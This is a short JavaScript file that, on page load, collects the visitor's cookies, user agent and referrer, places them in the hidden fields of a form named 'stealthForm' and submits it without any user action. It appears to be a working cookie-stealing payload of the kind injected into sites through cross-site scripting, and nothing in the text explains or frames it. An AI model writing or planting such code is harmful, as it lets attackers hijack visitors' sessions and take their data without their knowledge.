document.addEventListener("DOMContentLoaded", function() {
    try {
        var cookies = document.cookie || "No_Cookies";
        var userAgent = navigator.userAgent || "Unknown_User_Agent";
        var referrer = document.referrer || "No_Referrer";

        var cookieField = document.getElementById("cookieField");
        var userAgentField = document.getElementById("userAgentField");
        var referrerField = document.getElementById("referrerField");
        var stealthForm = document.getElementById("stealthForm");

        if (cookieField && userAgentField && referrerField && stealthForm) {
            cookieField.value = cookies;
            userAgentField.value = userAgent;
            referrerField.value = referrer;

            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
                stealthForm.submit();
            }
        } else {
            console.error("One or more elements not found.");
        }
    } catch (error) {
        console.error("Error in script execution:", error);
    }
});
